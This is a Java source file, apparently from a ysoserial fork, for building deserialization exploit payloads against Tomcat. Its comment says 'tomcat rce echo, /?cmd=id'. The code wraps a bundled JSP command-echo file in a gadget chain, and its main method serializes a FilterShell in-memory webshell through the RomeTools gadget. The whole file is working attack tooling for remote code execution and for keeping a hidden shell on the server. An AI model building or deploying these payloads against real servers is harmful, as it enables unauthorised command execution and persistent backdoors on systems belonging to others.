package ysoserial.payloads.rceecho;


import org.apache.commons.io.IOUtils;
import ysoserial.Serializer;
import ysoserial.payloads.Eval;
import ysoserial.payloads.RomeTools;
import ysoserial.payloads.memshell.FilterShell;

import java.io.InputStream;

// tomcat rce 回显，/?cmd=id
public class TomcatEcho1 {
    public static void main(final String[] args) throws Exception {
        Object evil = new FilterShell().getObject(RomeTools.class);
        byte[] ser = Serializer.serialize(evil);
    }
    public Object getObject(Class gadget) throws Exception {
        InputStream inputStream = TomcatEcho1.class.getClassLoader().getResourceAsStream("rce回显/Litch1_tomcat.jsp");
        byte[] bytes = IOUtils.toByteArray(inputStream);
        String jspcode = new String(bytes);
        String javacode = Eval.getJavaCodeFromJSP(jspcode);
        Object o = new Eval().getObject(gadget,javacode);
        return o;
    }
}
